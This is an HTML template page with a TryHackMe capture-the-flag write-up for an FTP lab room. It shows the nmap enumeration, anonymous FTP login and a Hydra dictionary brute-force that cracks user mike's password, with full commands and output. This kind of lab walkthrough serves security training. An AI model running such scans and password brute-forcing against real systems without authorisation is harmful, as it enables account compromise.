{% extends "base.html" %}{% block title %}Intro to Networking{%endblock%}
{% block content %}

<div class="container">
    <h1 id="typing-effect" class="display-2 mb-4"></h1> 
    <br />

    <div class="solution-div">

    <p>In this page I show how to solve the Exploiting FTP - Network Services room CTF on TryHackMe platform.
    </p>

    <h2>Enumeration</h2>

    <p>Let's start our enumeration process with Nmap port scanning. A simple nmap gives us:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap 10.10.221.150 -oN simple-nmap.out 
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 10:12 -03
            Nmap scan report for 10.10.221.150
            Host is up (0.23s latency).
            Not shown: 999 closed tcp ports (conn-refused)
            PORT   STATE SERVICE
            21/tcp open  ftp
                
            Nmap done: 1 IP address (1 host up) scanned in 29.29 seconds                     
            </code>
        </pre>
    </div>

    <p>
        The only (and more interesting) port open is port 21, the usual FTP port. Let's run another script here to check 
        its service. We might even be able to use Nmap to test for anonymous login.
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ nmap -A -p 21 10.10.221.150 -oN aggressive-p21-nmap.out 
            Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-23 10:15 -03
            Nmap scan report for 10.10.221.150
            Host is up (0.23s latency).
                
            PORT   STATE SERVICE VERSION
            21/tcp open  ftp     vsftpd 2.0.8 or later
            | ftp-syst: 
            |   STAT: 
            | FTP server status:
            |      Connected to ::ffff:10.18.5.100
            |      Logged in as ftp
            |      TYPE: ASCII
            |      No session bandwidth limit
            |      Session timeout in seconds is 300
            |      Control connection is plain text
            |      Data connections will be plain text
            |      At session startup, client count was 2
            |      vsFTPd 3.0.3 - secure, fast, stable
            |_End of status
            | ftp-anon: Anonymous FTP login allowed (FTP code 230)
            |_-rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
            Service Info: Host: Welcome
                
            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds               
            </code>
        </pre>
    </div>

    <p>
        We can see in one of these output lines we get: ftp-anon: Anonymous FTP login allowed (FTP code 230). This indicates 
        we are able to login as anonymous to the server. We have also discovered that the server version is vsftpd 2.0.8.
        To login as anonymous, we use the credentials anonymous:anonymous.
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ ftp 10.10.221.150                         
            Connected to 10.10.221.150.
            220 Welcome to the administrator FTP service.
            Name (10.10.221.150:alex): anonymous
            331 Please specify the password.
            Password: 
            230 Login successful.
            Remote system type is UNIX.
            Using binary mode to transfer files.
            ftp>   
            </code>
        </pre>
    </div>

    <p>
        We can list all files in the directory with the command ls. Here is the output:
    </p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            ftp> ls
            229 Entering Extended Passive Mode (|||35337|)
            150 Here comes the directory listing.
            -rw-r--r--    1 0        0             353 Apr 24  2020 PUBLIC_NOTICE.txt
            226 Directory send OK.                
            </code>
        </pre>
    </div>

    <p>Since this is the only file available, we can download it and see in our local machine by doing the following:</p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            ftp> get PUBLIC_NOTICE.txt
            local: PUBLIC_NOTICE.txt remote: PUBLIC_NOTICE.txt
            229 Entering Extended Passive Mode (|||58873|)
            150 Opening BINARY mode data connection for PUBLIC_NOTICE.txt (353 bytes).
            100% |***********************************|   353      155.77 KiB/s    00:00 ETA
            226 Transfer complete.
            353 bytes received in 00:00 (1.44 KiB/s)                 
            </code>
        </pre>
    </div>

    <p>
        After downloading it, we can see its contents in our local machine:
    </p>

    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ cat PUBLIC_NOTICE.txt                   
            ===================================
            MESSAGE FROM SYSTEM ADMINISTRATORS
            ===================================
                
            Hello,
                
            I hope everyone is aware that the
            FTP server will not be available 
            over the weekend- we will be 
            carrying out routine system 
            maintenance. Backups will be
            made to my account so I reccomend
            encrypting any sensitive data.
                
            Cheers,
                
            Mike              
            </code>
        </pre>
    </div>

    <p>Indicating a possible user called Mike. Excellent!</p>


    <h2>Exploitation</h2>

    <p>
        He have found interesting information here. However, we have not found any indication of what Mike's password is. Let's try 
        to break into the system by brute forcing passwords, using Hydra.
    </p>

    <p>The hydra command we want to run is the following:</p>

    <p><code class="hljs language-python"><span class="hljs-keyword">hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.150 ftp</span></code></p>
    
    <p>Let's break it down:</p>

    <br />

    <table>
        <tr>
            <th>SECTION</th>
            <th>FUNCTION</th>
        </tr>
        <tr>
            <td>hydra</td>
            <td>Runs the hydra tool</td>
        </tr>
        <tr>
            <td>-t 4</td>
            <td>Number of parallel connections per target</td>
        </tr>
        <tr>
            <td>-l [user]</td>
            <td>Points to the user whose account you're trying to compromise</td>
        </tr>
        <tr>
            <td>-P [path to dictionary]</td>
            <td>Points to the file containing the list of possible passwords</td>
        </tr>
        <tr>
            <td>-vV</td>
            <td>Sets verbose mode to very verbose, shows the login+password combination for each attempt</td>
        </tr>
        <tr>
            <td>[machine IP]</td>
            <td>The IP address of the target machine</td>
        </tr>
        <tr>
            <td>ftp / protocol</td>
            <td>Sets the protocol</td>
        </tr>
    </table>

    <br />

    <p>Running Hydra does not take long for us to find the password:</p>
    
    
    
    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">
            └─$ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.221.150 ftp
            Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
                
            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-23 10:36:50
            [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
            [DATA] attacking ftp://10.10.221.150:21/
            [VERBOSE] Resolving addresses ... [VERBOSE] resolving done
            [ATTEMPT] target 10.10.221.150 - login "mike" - pass "123456" - 1 of 14344398 [child 0] (0/0)
            [ATTEMPT] target 10.10.221.150 - login "mike" - pass "12345" - 2 of 14344398 [child 1] (0/0)
            [ATTEMPT] target 10.10.221.150 - login "mike" - pass "123456789" - 3 of 14344398 [child 2] (0/0)
            [ATTEMPT] target 10.10.221.150 - login "mike" - pass "password" - 4 of 14344398 [child 3] (0/0)
            [21][ftp] host: 10.10.221.150   login: mike   password: password
            [STATUS] attack finished for 10.10.221.150 (waiting for children to complete tests)
            1 of 1 target successfully completed, 1 valid password found
            Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-23 10:36:56     
            </code>
        </pre>
    </div>   

    <p>What a difficult password, eh?</p>

    <p>Now we can connect to the FTP server again with Mike's credentials.</p>


    <div class="shrink">
        <pre>
            <code id="text" class="hljs language-bash">  
            └─$ ftp 10.10.221.150
            Connected to 10.10.221.150.
            220 Welcome to the administrator FTP service.
            Name (10.10.221.150:alex): mike
            331 Please specify the password.
            Password: 
            230 Login successful.
            Remote system type is UNIX.
            Using binary mode to transfer files.
            ftp> ls
            229 Entering Extended Passive Mode (|||11768|)
            150 Here comes the directory listing.
            drwxrwxrwx    2 0        0            4096 Apr 24  2020 ftp
            -rwxrwxrwx    1 0        0              26 Apr 24  2020 ftp.txt
            226 Directory send OK.
            ftp> 
            </code>
        </pre>
    </div>

    <p>And we have found the flag in ftp.txt!</p>

    <a href="/ctfs">Go back</a>

    </div>

</div>


{% endblock %}